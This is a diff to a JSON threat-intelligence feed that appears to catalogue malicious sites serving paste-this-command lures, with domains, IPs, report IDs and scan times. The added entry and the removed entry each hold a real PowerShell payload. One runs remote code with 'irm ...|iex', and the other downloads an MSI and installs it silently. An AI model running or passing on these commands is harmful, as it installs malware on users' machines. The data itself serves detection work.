@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "anglowealth.co.za",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "41.185.8.150"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/6a1e6596d11a876e",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=8a080f7c71f15a075161debc4157e5b2fe125202baaae268&amp;_v=29917053",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/6a1e6596d11a876e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/6a1e6596d11a876e"
+    ],
+    "ReportId": "cmwmei4nv1tbg0omlbgmnensw",
+    "ScannedAt": "2026-11-18T17:34:21.022000+00:00"
+  },
+  {
     "UrlDomain": "wistech.biz",
     "DeliveryUrl": [
       "fbifr.com"
@@ -8974,24 +9000,5 @@
     ],
     "ReportId": "cmwfarq1i0fv30oml7sg6ahis",
     "ScannedAt": "2026-11-13T18:15:25.997000+00:00"
-  },
-  {
-    "UrlDomain": "flashingdocs.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwf9tn7k0fqr0omliwntu216",
-    "ScannedAt": "2026-11-13T17:48:56.960000+00:00"
   }
 ]
